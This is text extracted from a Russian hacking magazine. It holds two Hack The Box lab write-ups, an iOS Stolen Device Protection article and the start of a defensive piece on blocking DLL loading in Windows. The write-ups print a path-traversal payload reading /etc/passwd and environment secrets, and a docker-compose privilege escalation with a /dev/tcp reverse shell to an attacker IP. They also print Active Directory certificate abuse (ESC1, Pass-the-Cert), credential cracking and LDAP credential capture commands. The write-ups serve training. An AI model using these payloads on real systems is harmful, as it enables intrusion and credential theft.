конечных точек API есть обработчик /webhooks/:uuid/logs, отсутствующий
в получен ном ранее описании.





                  Со держимое файла Api.php





                 Содержимое файла Router.php

Фун кции, которые обрабатывают зап росы  к API /webhooks/:uuid/logs,
находят ся в файле LogsController.php. У этого API есть две возможности:
вывод списка и чтение (строки 50 и 56).





              Содержимое файла LogsController.php

Фун кция чтения интереснее, так как позволяет получить содержимое файла
из файловой системы. Чтобы мы не читали какие попало фай лы, к перемен-
ной log_name при меняются филь тры. Один из них не разрешает пос ледова-
тель ность ../ (стро ки 59–62), используемую для обхода каталога, а второй
удаляет все пробелы (стро ки 64–69).
   Та кую фильтрацию лег ко обойти последовательностью .  ./, которая
при удалении пробела прев ращается в ../. Однако нам нужно, чтобы сущес-
тво вал веб-хук с таким именем. Это лег ко орга низовать, так как у нас есть
доступ к базе дан ных. Меняем имя хука, а затем пыта емся получить содер-
жимое файла /etc/passwd (не забываем использовать в запросе най денный
api-key).


update webhooks set name='../../../../../' where uuid=
'fda96d32-e8c8-4301-8fb3-c821a316cf77';



                     Изменение име ни хука


{
    "action":"read",
    "log_name":". ./. ./. ./. ./logs/. ./. ./. ./. ./etc/passwd"
}





                 По лучение файла /etc/passwd

Те перь читаем файл /proc/self/environ, содержащий переменные окру-
жения про цесса.


{
    "action":"read",
    "log_name":". ./. ./. ./. ./logs/. ./. ./. ./. ./proc/self/
environ"
}





                По лучение фай ла /proc/self/environ

По лучаем новый пароль, который необходимо сразу проверить на всех дос-
тупных сер висах. С ним мы авто ризуемся по SSH и получаем первый флаг.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Так как разведку на хос те мы уже проводи ли, оста ется про верить не так много
тех ник для повыше ния привилегий. Одна из них связана с запус ком при виле-
гированных команд через sudo.





                       Настройки sudoers

Мы можем запустить скрипт /opt/secure_compose.py от име ни пользовате-
ля root и передать ему любой YAML-файл. Взглянем на содер жимое скрипта.
Сна чала в функции main проверя ется, существует ли переданный файл.
Затем выпол няет ся его заг рузка и десериализация (строки 44–53). Сле-
дом — проверка существования бло ка services и его передача в функцию
check_no_privileged (стро ки 55–63). Пос ле этого для каждого блока в фун-
кциях check_whitelist, check_read_only и check_no_symlinks проверя-
ется блок volumes (стро ки 65–73).





                Исходный код secure_compose.py

Ес ли все проверки пройдены, то для этой конфигурации запус кается контей-
нер Docker (стро ки 101–110). Наз вания фун кций проверки говорят сами
за себя.





                Исходный код secure_compose.py

Нам  нужно  передать  скрип ту  такую  конфигурацию,  которая  позволит
повысить при виле гии на хосте, но при этом прой дет все провер ки. Сразу
обратим внимание на то, что нет фильтра для capabilities, а значит,
передав параметр cap_add=ALL, мы активируем все привиле гии, что почти
эквивалентно privileged=True. Также мы можем под ключить к контейнеру
корневой раздел основной файловой системы, для этого используем нас-
тройку безопасности apparmor=unconfined и указываем устрой ство /dev/
sda1.
  Осталось только получить доступ из самого контейнера, но и эта проб-
лема  лег ко  решается.  В  качес тве  параметра  command  передадим
реверс-шелл, который даст нам сессию при запус ке контейнера.
  В ито ге собира ем сле дующий YAML-файл, запускаем лис тенер (pwncat-
cs -lp 4321) и выполняем скрипт.


version: '3'


services:
 api:
   image: cybermonday_api
   command: bash -c "bash -i >/dev/tcp/10.10.16.11/4321 0>&1 2<&1"
   cap_add:
     - ALL
   devices:
     - /dev/sda1:/dev/sda1
   security_opt:
     - "apparmor=unconfined"


sudo /opt/secure_compose.py /dev/shm/ralf.yml




                       Запуск контейнера





                    Сессия root в контей нере

По лучаем сессию root в контейнере. Монтиру ем раздел /dev/sda1 и про-
веряем имя хоста.


mount /dev/sda1 /mnt/
cat /mnt/etc/hostname





               Провер ка при монтированных файлов

Все получи лось так, как я и задумывал. Переходим в домашний каталог рута
и забираем пос ледний флаг.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом райтапе я покажу, как при менять
тех нику ESC1 ADCS для получения сер-
тифика та администра тора и Pass the Cert
для получе ния доступа к хосту. Также дос-
танем учетные данные из Ansible и стриг-             RalfHacker                                                                                             hackerralf8@gmail.com
герим подключение к сво ему серверу LDAP
для перех вата учет ных данных.


Нашей целью будет зах ват рута на тренировочной машине Authority с площад-
ки Hack The Box. Уровень ее сложности — средний.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.222    authority.htb

И начинаем сканирование портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).



Так как Windows может не отвечать на пинг, исклю чим этот шаг из сканиро-
вания (опция -Pn).





                    Резуль тат работы скрипта

Сканер нашел мно жество открытых портов, что характерно для серверов
на Windows:
 • 53 — служба DNS;
 • 80 (HTTP) — веб-сервер Microsoft IIS/10.0;
 • 88 — служба Kerberos;
 • 135 — служба удаленного вызова про цедур (Microsoft RPC);
 • 139 — служба сеан сов NetBIOS, NetLogon;
 • 389 — служ ба LDAP;
 • 445 — служба SMB;
 • 464 — служба сме ны пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — использует ся в служ бах DCOM и MS Exchange;
 • 636 — LDAP с шиф рованием SSL или TLS;
 • 5985 — служба удаленного управления WinRM;
 • 8443 — веб-сер вер, выполняющий редирект на страницу /pwm;
 • 9389 — веб-служ бы AD DS.


ÒÎ×ÊÀ ÂÕÎÄÀ

Первым делом проверим доступ от имени гостевой учетной записи, для чего
будем исполь зовать фрей мворк CrackMapExec.


crackmapexec smb 10.10.11.222 -u guest -p ""



                Провер ка гос тевой учет ной записи

Доступ есть, про верим дос тупные для чтения общие ресур сы.


crackmapexec smb 10.10.11.222 -u guest -p "" --sahres





                   Об щие ресурсы SMB

В списке значится интересный каталог Development, который мы можем
прос мотреть. Под ключаем к шаре с помощью impacket-smbclient и смот-
рим содержимое.


impacket-smbclient guest@10.10.11.222
use Development
ls





             Содержимое SMB-ресур са Development

Видим вло женный каталог. Спустившись по каталогам дальше, находим
директорию Ansible, содержащую папки ADCS, LDAP, PWM и SHARE.





                      Вло женные катало ги


ÒÎ×ÊÀ ÎÏÎÐÛ

В катало ге PWM\defaults находим файл .yml, содер жащий зашифрованные
учетные дан ные.


get PWM\defaults\main.yml
cat main.yml





                 Содержимое фай ла main.yml

Все учетные данные зашифрованы одним клю чом, который мож но попытаться
подоб рать. Пер вым делом сохраним один из блоков в файл, который затем
передадим  скрип ту  ansible2john.py  для  преобразова ния  в  формат
hashcat/jtr.




                  Преобразова ние блока данных

Те перь опре делим тип хеша. Делать это удобно с помощью справ ки hashcat.


hashcat --example | grep -A7 -B11 'ansible'





                         Справка hashcat

Те перь сохраняем хеш в файл и передаем его в hashcat вместе с полученным
режимом 16900 (параметр -m) и списком паролей.


ansible2john ansible_hash2.txt > hash.txt
hashcat -m 16900 -a 0 --username hash.txt rockyou.txt



                    Результат перебора хеша

В ито ге получаем ключ, которым можно расшифровать все пароли. Каждый
сохраняем в отдельный файл и используем ansible-vault decrypt.


cat ansible_hash.txt | ansible-vault decrypt
cat ansible_hash2.txt | ansible-vault decrypt
cat ansible_hash3.txt | ansible-vault decrypt





                 По лучение паролей ansible-vault




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



            ПОВЫШАЕМ ПРИВИЛЕГИИ
         В WINDOWS ЧЕРЕЗ ESC1 И PASS
                            THE CERT





ÏÐÎÄÂÈÆÅÍÈÅ

С полученными учетными данными авторизо ваться на службах не удалось.
Но мы так же получили креды для PWM на порте 8443.





                   Под клю чение к порту 8443

По лучаем ошиб ку, которая сооб щает о том, что обя зате лен TLS. Значит,
меня ем протокол с HTTP на HTTPS.





                        Главная стра ница сай та

Для авто ризации нужен логин, которого у нас нет. Но если перей ти к менед-
жеру настро ек, то там требуется только сервисный пароль.





                   Менеджер нас троек





               Страница авто ризованного пользователя

На этой странице можно сохранять или загружать нас тройки. Так же отоб-
ражается таб лица состояния, в которой видим ошиб ку подключения к LDAP.
Видимо, адрес сервера LDAP указан в нас тройках, и если мы сможем их
изме нить, то вызовем авто ризацию на свой сер вер. Причем пароли LDAP
передаются в открытом виде.





                     Скачанная кон фигурация

Находим адрес LDAP в скачанных настрой ках и перепи сываем значение
на свой адрес.



                    Измененная конфигура ция

Запускаем у себя многофункциональ ный лис тенер Responder и загружаем
изме нен ный файл.


sudo responder -I tun0 -v





                       Ло ги Responder

В запросе есть как логин, так и пароль доменного пользовате ля svc_ldap.
Для про верки учетных дан ных пробуем получить спи сок пользователей
с помощью CrackMapExec.


crackmapexec smb 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
--users




                       Пользователи домена

Поль зователей  мало,  проверим,  сос тоит  ли  наш  в  группе  Remote
Management Users.


crackmapexec smb 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
--groups 'Remote Management Users'



               Чле ны группы Remote Management Users

Таким образом, пользователь может получить управление через службу
WinRM. Для под клю чения используем утилиту Evil-WinRM.


evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'



                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

В общем каталоге также была директория ADCS. Службы сертификатов Active
Directory (AD CS) — это настра иваемые службы для выдачи сертификатов
и управле ния ими в системах безопас ности ПО, исполь зующих технологии
откры тых клю чей.
  Цен тры сер тификации AD CS выдают сертификаты с параметрами,
которые определяются шаб лонами. Эти шаб лоны представляют собой
наборы политик регистрации и предоп ределенных параметров сертификата
и содержат разные све дения, например:
 • срок дей ствия сер тификата;
 • пред назна чение сертификата;
 • способ ука зания субъекта;
 • ко му разрешено зап росить сер тификаты.

Каж дый ЦС  пред приятия  поставляется  с шаблонами  по  умол чанию,
и общепринята практика брать их за основу. То есть если ты хочешь дать кли-
енту сер тификат для работы с 802.1x, то нужно взять копию шаблона
Computer, а если S/MIME-сертифика ты, то копию шаблона User. Названия
шаб лонов могут сбить с толку, одна ко фун даментальной раз ницы между ними
нет. Каждый шаб лон может выдать сертификат любого типа, если он запол-
нен правильными параметрами. Но шаблоны сертификатов — это также
защища емые объекты в Active  Directory, то есть они имеют дескриптор
безопасности, указывающий, какие участники Active Directory имеют опре-
деленные права для шаблона.
  Получить информацию о центре сер тифика ции и про верить уязвимые
шаб лоны мож но с помощью утилиты Certify.


.\Certify.exe find /vulnerable





                    Информация из ADCS

Видим уязвимый шаб лон сер тификата CorpVPN. Этот сертификат уяз вим
к технике повыше ния привилегий ESC1:
 • Enrollment Permissions показывает, что компьютеры домена могут
   запросить сер тификат без утверждения менеджером;
 • pKIExtendedKeyUsage  показывает,  что сертификат может  исполь-
   зовать ся для аутен тификации в домене (Client Authentication);
 • msPKI-Certificate-Name-Flag          содер жит          флаг
  CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, говорящий о том, что шаблон
   сертификата позволя ет запрашивающим лицам указывать имя объекта
   в CSR.

Пос ледний пункт при водит к тому, что пользователь с низкими при вилегиями
может зап рашивать сертификат с произвольным SAN, то есть для любого
поль зовате ля в домене, вклю чая администратора. Затем можно использовать
этот сертификат для аутентификации от имени указан ного пользователя.
  Но так как получить сертификат может только компьютер, создаем подкон-
трольную учет ную запись компьютера.


impacket-addcomputer  authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'
-computer-name 'rcomp$' -computer-pass 'RRrr!!11'




               Создание учет ной записи компь ютера

Для работы версии Certipy на Python нужно добавить в /etc/hosts записи
для компьюте ра и цен тра сертификации.


10.10.11.222 authority.htb authority.authority.htb AUTHORITY-CA

А от име ни соз данного компь ютера запросим сертификат для поль зователя
Administrator.


certipy-ad req -u 'rcomp$' -p 'RRrr!!11' -ca AUTHORITY-CA -target
authority.htb -template CorpVPN -upn administrator@authority.htb -dns
 authority.authority.htb -dc-ip 10.10.11.222





             По лучение сертификата адми нис тратора

Те перь нужно получить доступ к машине.


Pass the certificate
Pass the cert — это техника получения билета TGT, при которой для аутен-
тификации используется сертификат пользователя вмес то пароля. Обычно
это мож но про вер нуть в той же Certipy, но в дан ном случае получа ем ошибку.


certipy-ad auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222





                Ошиб ка получения TGT-билета

Certipy и  PKINITtools используют  PKINIT и  получают  TGT-билет,  чтобы
с помощью тех ники UnPac the hash извлечь NT-хеш учетной записи. Если вер-
нуть ся к шаблону сертификата, можно увидеть, что он не имеет EKU Smart
Card Logon, а значит, и не будет под держки PKINIT! Тогда возь мем другую
программу — PassTheCert. Она подклю чается к LDAP, используя аутентифика-
цию Schannel. Но сперва разделим файл PFX на сертификат и ключ.


certipy-ad cert -pfx administrator_authority.pfx -nokey -out
administrator_authority.crt


certipy-ad cert -pfx administrator_authority.pfx -nocert -out
administrator_authority.key





                 Извлечение сертификата и ключа

В PassTheCert есть очень удоб ная встроенная утилита для работы с LDAP —
ldap_shell. Получив доступ к LDAP коман дой add_user_to_group, добавляем
созданную учетную запись компьюте ра в группу администраторов.


python3 passthecert.py -action ldap-shell -crt administrator_
authority.crt -key administrator_authority.key -domain authority.htb
-dc-ip 10.10.11.222




                Эксплуатация Pass the Cert через LDAP

А теперь под ключаемся через WinRM и забираем флаг администратора.


evil-winrm -i 10.10.11.222 -u 'rcomp$' -p 'RRrr!!11'




                           Флаг рута

Машина захвачена!
ПРИВАТНОСТЬ





В новой бете iOS 17.3 появилась интерес-
ная  функция  Stolen  Device   Protection,
которая приз вана обеспечить дополнитель-
ный уро вень безопас ности. Эта фича будет
сто ять на страже как чувс тви тельных дан-           Олег Афонин                                                                                      Эксперт по мобильной
ных, так и учетной записи Apple ID, если       криминалистике компании                                                                                         «Элкомсофт»
вмес те с самим устройством злоумыш-        aoleg@voicecallcentral.com
ленник получит его код бло кировки. Раз-
беремся под робно — от чего и как она
защищает.


Традици онно считалось, что код блокировки («пароль на iPhone») более
безопасен, чем любые методы биометричес кой аутентификации. В рамках
экосистемы Apple код блокировки экрана дол гое время был и до сих пор
остается самым важ ным клю чом ко всему. Имея на руках iPhone пользователя
и зная код блокировки, можно получить дос туп практичес ки ко всему и изме-
нить прак тически всё. Нап ример, зная PIN, можно просмотреть все пароли
поль зовате ля из связки ключей, в том числе от важных учетных записей. Взло-
мав их, зло умыш ленник фактичес ки полностью завладеет цифровой лич-
ностью жертвы.
  Мож но сбросить пароль от iCloud, уда лить ста рый и добавить новый
доверенный телефонный номер — после чего злоумыш ленник становится
в глазах Apple «законным вла дельцем» учетной записи. На самом устрой стве
можно сбро сить пароль от резервной копии, подклю чить его к компьюте ру
и извлечь из него данные хорошо известным способом. Не будет преуве-
личе нием сказать, что код блокировки (вмес те с самим аппаратом) — бук-
вально ключ ко всему.
   «Не слишком ли много завязано на один лишь код блокировки? — веро-
ятно, подумали в Apple. — А вдруг зло умышленник подсмотрит или, хуже того,
заставит сообщить код блокировки экрана? Нель зя ли с этим что-нибудь сде-
лать?»
  Воз можно, на эту мысль разработ чиков компании навели статьи, подоб-
ные пуб ликации в Wall Street Journal A Basic iPhone Feature Helps Criminals
Steal Your Entire Digital Life, а также обсужде ния на сай те Apple, в которых рас-
сказыва лись (а также активно читались и обсуждались) страшные истории
о том, что случилось с тем или иным пользователем, у которого злоумыш-
ленники не только украли или отняли iPhone, но и различны ми спо соба ми
узнали пароль от него. Вкратце: ничего хорошего, много пло хого, а испра-
вить разрушительные последствия гра мотных действий зло умышленни ков
очень тяжело или и вовсе невозможно (и в Apple даже не пытались помочь
пос традав шим).
  Вряд ли в Apple хотят защитить данные поль зовате лей от действий
полиции, которая может изъять телефон и зас тавить подозреваемого выдать
пароль. Однако лабораторный ана лиз устройств даже с известным кодом
блокировки будет существенно осложнен, а то и вов се станет невозможным
(нап ример, мы пока не знаем, защищает ли новая функция от сопряжения
iPhone с компьюте ром). Скорее защитить пытаются от следующих сце нариев:
 1. Злоумышленники подсмотрели код бло кировки, после чего украли iPhone.
 2. Грабители отняли iPhone и заставили сооб щить код бло кировки от него.
 3. iPhone попал в руки организованной преступной группы, которая собира-
   ется не прос то сбро сить устрой ство или продать его на запчасти, а вос-
   пользоваться им по максимуму — начиная с опус тошения привязанных
   к Apple Pay сче тов и заканчивая угоном учетных записей в социальных
   сетях с последующей кражей данных и шан тажом. Увы, это не фантасти ка,
   такие про исшес твия регуляр но освещаются на страницах газет.





ÊÀÊ ÏÛÒÀÞÒÑß ÐÅØÈÒÜ ÏÐÎÁËÅÌÓ

Раз на доверенное устройство и код бло киров ки от него завязано столько
все го, разработ чикам функции Stolen Device Protection потребова лось «раз-
мыть» вес пароля от iPhone в качестве универ сального ключа. Сделать
это попыта лись двумя спо собами.
  Âî ïåðâûõ, для ряда действий (нап ример, для просмотра сохраненных
на устройстве паролей или сброса устройства) отклю чает ся функция так
называемого passcode fallback — ког да пос ле неудачной попытки аутен-
тификации по лицу (Face ID) или датчику отпечатков (Touch ID) сис тема зап-
рашивает код бло кировки. Таким образом, для просмотра паролей или сбро-
са нас троек (при включенной функции Stolen Device Protection) аутентифици-
роваться мож но толь ко при помощи биометрии — но не вводом кода бло-
кировки.
  Âî âòî ðûõ, для самых опасных действий (нап ример, изменение пароля
от Apple ID или отвязка телефона от iCloud) потребуется не только биомет-
рическая аутентификация (без возможности исполь зовать вместо нее PIN-
код) — в ряде случаев при дет ся подождать как минимум час, после чего пов-
торить попытку, снова пройдя аутентификацию с биометрией. И да, добав-
ление нового лица или отпечатка тоже пот ребует выж дать паузу.


ÊÀÊ ÝÒÎ ÐÀÁÎÒÀÅÒ

По ка что фун кция Stolen Device Protection активно тес тируется; мы не зна ем,
в каком виде она войдет в релизную сборку iOS 17.3. Пос ле релиза Apple
собирается подробно документировать фун кцию, но пока этого не сделали.
На сегодняшний день имеем сле дующее.
  Дей ствия, для которых потребуется аутен тификация Face ID или Touch ID:
 • просмотр или использование паролей и ключей из связки ключей;
 • просмотр и добав ление платежных карт в Apple Pay;
 • от клю чение режима Lost Mode;
 • сброс настроек (например, Reset all settings, которая оставляет данные,
   но сбра сывает код блокировки устрой ства и пароль к резервной копии);
 • некоторые действия в Wallet (в основном у пользователей Apple Cash);
 • оплата в Safari с исполь зованием сох раненных платеж ных карт;
 • ис поль зование iPhone для нас тройки нового устройства.

Для некоторых дей ствий не только потребуется аутен тификация через Face ID
или Touch ID, но и вводится дополнительная часовая задержка. При этом
Apple оговаривает, что задержки не будет, если iPhone находится в одном
из постоянных мест пребывания пользователя, например дома или на
работе. Ско рее всего, для это го используется малоизвес тная, но давно
существующая в iOS функция Frequent Locations. Итак, часовая задержка (в
дополнение к биометрической аутентифика ции) вводится:
 • при изме нении пароля от Apple ID;
 • при обновле нии некото рых парамет ров безопасности Apple ID, включая
   добав ление или уда ление доверен ных устройств, доверенного номера
   телефона, Recovery Key или Recovery Contact;
 • из менение кода бло кировки iPhone;
 • до бав ление или уда ление Face ID или Touch ID;
 • от клю чение фун кции Find My iPhone;
 • от клю чение самой функции Stolen Device Protection.


ÌÎÆÍÎ ËÈ ÒÀÊÈÌ ÎÁÐÀÇÎÌ ÇÀÙÈÒÈÒÜ ÑÂÎÈ ÄÀÍÍÛÅ ÎÒ
ÈÇÂËÅ×ÅÍÈß?

Ес ли твой iPhone попал в руки специалистов, которые попытаются извлечь
из него данные, то новая функция поможет частично защитить информа цию.
Почему «частично»? Дело в том, что при извес тном коде бло кировки новая
функция не помешает ни получить дос туп к домашнему экрану устройства,
ни запустить при ложе ния почты или твой любимый мес сенджер. Соот ветс-
твен но, переписку, фотографии и многие другие данные можно прос матри-
вать прямо на экра не устройства; для докумен тирова ния процес са мож но
делать скриншоты и пересы лать их куда угодно и как угодно.
  Чего не получит ся сделать — это просмотреть твои сохраненные пароли.
Пока непонят но, сработа ет ли сопряжение с компьютером, но если у тебя
установлен пароль на резервную копию (ведь установ лен же?), то сбросить
его уже не получится — а зна чит, и сама резер вная копия будет бесполез ной,
ведь ско рость перебора паролей к ней — буквально десят ки паролей в секун-
ду.
  Для iOS 17.3 пока не сущес тву ет экспло итов, а устройства, на которые ее
можно установить, не под вержены Checkm8, так что со стороны низ коуров-
невых атак твой телефон будет защищен.


ÊÎÃÄÀ È ÃÄÅ?

Фун кция появится на всех моделях iPhone, совместимых с iOS 17, начиная
с iPhone XS. Вероятно, релиз iOS 17.3 вый дет в первые месяцы 2024 года.


À ÌÛ ÏÐÅÄÓÏÐÅÆÄÀËÈ!

Еще в далеком 2017 году я писал тре вожную статью, в которой пря мо говорил
об  опас ности,  которую  представляет  собой  чрез мерная  зависимость
от одного лишь пароля, а в статье о безопасности iOS и вовсе назвал код
блокировки «ложкой дегтя». В «Четырех с половиной паролях» четыре года
назад писал о том, как при помощи пароля от iPhone легко сбросить все
остальные. И вот, кажет ся, почти свершилось! Не прошло и шести релизов
iOS, как в Apple обра тили внимание на слона — и, похоже, готовы наконец
изгнать его из посудной лавки.
КОДИНГ





Злые вирусы  так и норовят подгрузить
в нашу легитимную программу свои биб-
лиоте ки! Возможно ли изба виться от чужих
модулей? Как предотвратить заг рузку биб-
лиотек или хотя бы сво евременно о ней         MichelleVermishelle                                                                                       @Michaelzhm
узнать? Давай разбираться.                                      michael.zhmailo@yandex.ru


В основном Windows использует два формата исполняемых фай лов — .exe
и DLL. Первые представляют собой привычные для нас прог раммы, а DLL —
это биб лиотеки с дополнительными функциями, подгру жаемые исполняемым
файлом. Фай лы DLL могут быть заг ружены в процесс и сразу при запус ке (так
называемая статическая линковка), и при выполнении (динамическая лин-
ковка), то есть когда процесс уже вов сю работает и вдруг что-то его под-
талки вает к решению заг рузить биб лиотеку.
  Ни для кого не секрет, что процес сы в Windows имеют виртуальное
адресное пространство. Пространс тво пред ставляет собой кусок памяти,
который принадлежит только текущему про цессу. В этой части памяти будут
данные толь ко текуще го процесса. При подгрузке DLL оказывается в том же
самом адресном пространс тве и, как следс твие, получает доступ ко всем
данным процесса. Такое поведе ние приводит к тому, что злос тные хакеры так
и желают, так и ждут подгрузки сво ей вредонос ной библиоте ки в наш про-
цесс, что бы установить хуки, сдам пить память и всячески изме нить поведе-
ние программы. С этим можно бороться! Давай пос мотрим как.


UPDATEPROCTHREADATTRIBUTE

Предлагаю начать с наибо лее распространен ных способов предотвращения
под грузки DLL-библиотек в процесс. Первый вариант основан на функции
UpdateProcThreadAttribute(). Для его реализации устанавливается специаль-
ное значение:


PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY

Единственная проб лема — в нашу прог рамму все-таки смо гут внедряться
чужие либы, но только если они подписаны в Microsoft. Также стоит отме тить,
что пре дотвращение подгрузки DLL будет при меняться к про цессу, который
мы запус тим через CreateProcess(), к текущему процес су при менить эту
функцию не получится.
  Тем не менее есть возможность обойти это ограничение. Наш текущий
про цесс может про верять, был ли он запущен с параметром, ограничи-
вающим подгрузку DLL. Если нет, то он запус кает копию самого себя, но уже
с   помощью   атрибутов,   которые   уста навливаются   в   функции
UpdateProcThreadAttribute().
   Итак, сначала напишем функцию CreateProcessWithBlockDllPolicy().
Для этого нам потребуется лишь путь до исполня емого фай ла, который нужно
запустить. Функция будет воз вращать PID запущен ного процесса, его хендл,
а также хендл потока процесса.


BOOL CreateProcessWithBlockDllPolicy(IN LPSTR lpProcessPath, OUT
DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
  STARTUPINFOEXA    SiEx = { 0 };
  PROCESS_INFORMATION   Pi = { 0 };
  SIZE_T        sAttrSize = NULL;


  if (lpProcessPath == NULL)
    return FALSE;


  RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
  RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));


  SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
  SiEx.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;


  InitializeProcThreadAttributeList(NULL, 1, NULL, &sAttrSize);
  LPPROC_THREAD_ATTRIBUTE_LIST pAttrBuf = (
LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),
HEAP_ZERO_MEMORY, sAttrSize);


  if (!InitializeProcThreadAttributeList(pAttrBuf, 1, NULL, &
sAttrSize)) {
    printf("[!] InitializeProcThreadAttributeList Failed With
Error : %d \n", GetLastError());
    return FALSE;
  }


  DWORD64 dwPolicy =
PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAY
S_ON
;


  if (!UpdateProcThreadAttribute(pAttrBuf, NULL,
PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dwPolicy, sizeof(DWORD64),
NULL, NULL)) {
    printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n",
GetLastError());
    return FALSE;
  }


  SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)pAttrBuf;


  if (!CreateProcessA(
    NULL,
    lpProcessPath,
    NULL,
    NULL,
    FALSE,
    EXTENDED_STARTUPINFO_PRESENT,
    NULL,
    NULL,
    &SiEx.StartupInfo,
    &Pi)) {
    printf("[!] CreateProcessA Failed With Error : %d \n",
GetLastError());
    return FALSE;
  }


  *dwProcessId = Pi.dwProcessId;
  *hProcess = Pi.hProcess;
  *hThread = Pi.hThread;


  DeleteProcThreadAttributeList(pAttrBuf);
  HeapFree(GetProcessHeap(), 0, pAttrBuf);


  if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
    return TRUE;
  else
    return FALSE;
}

Сна чала мы очи щаем структуры, а затем инициализируем струк туры, необ-
ходимые для запус ка процесса. Дополнительно уста навливаем флаг:


EXTENDED_STARTUPINFO_PRESENT

Это даст возможность зап скать процессы с нужной митигацией.
  Далее с помощью функции InitializeProcThreadAttributeList() готовим струк-
туру  LPPROC_THREAD_ATTRIBUTE_LIST. Ее  будем  указывать  в функцию
UpdateProcAttributeList(). Двойной вызов функции стандартен для Windows —
первый вызов служит для получения нуж ного размера, а вто рой для ини-
циализации эле мен тов структуры.
  Затем с помощью фун кции UpdateProcAttributeList() заносим необ-
ходимые атри буты в нашу струк туру со списком атри бутов, после чего при-
меня ем ее в функции CreateProcessA(), что позволя ет запустить процесс
с защитой от под груз ки левых библиотек.
   Как же запустить текущий процесс, применив эту функцию? Здесь будем
использовать аргументы командной стро ки. Наш процесс может породить
дочерний такой же про цесс с митига цией, а самого себя уничтожить. Для это-
го нам нужно создать специальный STOP_ARG. Если вдруг в аргументах коман-
дной стро ки текущего процес са нет STOP_ARG, то он должен перезапус титься
с защитой от под груз ки DLL.
  Наша функция main() дол жна выглядеть вот так:


#define LOCAL_BLOCKDLLPOLICY
#ifdef LOCAL_BLOCKDLLPOLICY
#define STOP_ARG "xakep"
#endif


int main(int argc, char* argv[]) {


  DWORD   dwProcessId = NULL;
  HANDLE  hProcess = NULL,
    hThread = NULL;


#ifdef LOCAL_BLOCKDLLPOLICY
  if (argc == 2 && (strcmp(argv[1], STOP_ARG) == 0)) {
    printf("[+] Process Is Now Protected With The Block Dll Policy \n
");


    WaitForSingleObject((HANDLE)-1, INFINITE);
  }
  else {


    printf("[!] Local Process Is Not Protected With The Block Dll
Policy \n");


    CHAR pcFilename[MAX_PATH * 2];
    if (!GetModuleFileNameA(NULL, (LPSTR)&pcFilename, MAX_PATH * 2))
{
      printf("[!] GetModuleFileNameA Failed With Error : %d \n",
GetLastError());
      return -1;
    }


    DWORD dwBufferSize = (DWORD)(lstrlenA(pcFilename) + lstrlenA(
STOP_ARG) + 0xFF);
    CHAR* pcBuffer = (CHAR*)HeapAlloc(GetProcessHeap(),
HEAP_ZERO_MEMORY, dwBufferSize);
    if (!pcBuffer)
      return FALSE;


    sprintf_s(pcBuffer, dwBufferSize, "%s %s", pcFilename, STOP_ARG);


    if (!CreateProcessWithBlockDllPolicy(pcBuffer, &dwProcessId, &
hProcess, &hThread)) {
      return -1;
    }


    HeapFree(GetProcessHeap(), 0, pcBuffer);


    printf("[i] Process Created With Pid %d \n", dwProcessId);
  }
#endif
#ifndef LOCAL_BLOCKDLLPOLICY
  if (!CreateProcessWithBlockDllPolicy((LPSTR)"C:\\Windows\\System32\
\RuntimeBroker.exe", &dwProcessId, &hProcess, &hThread)) {
    return -1;
  }
  printf("[i] Process Created With Pid %d \n", dwProcessId);


#endif
  return 0;
}

Сна чала объявляются некоторые директивы, позволяющие управлять тем, что
мы хотим получить от кода. Если хотим защитить собственную программу, то
оставляем define LOCAL_BLOCKDLLPOLICY. Если хотим запустить иной про-
цесс с защитой от подгрузки DLL, то уби раем это поле.
  Затем указываем необходимый STOP_ARG, а в самой функции main() про-
веряем, присутс твует ли STOP_ARG в аргументах командной строки. Если он
есть, то про цесс может спокойно про должать свое выполнение.


  if (argc == 2 && (strcmp(argv[1], STOP_ARG) == 0)) {
    printf("[+] Process Is Now Protected With The Block Dll Policy \n
");
    // Продолжаем выполнение
    // Наш код тут


    WaitForSingleObject((HANDLE)-1, INFINITE);
  }

Ес ли же этого аргумента нет, то процесс порож дает сам себя с защитой.


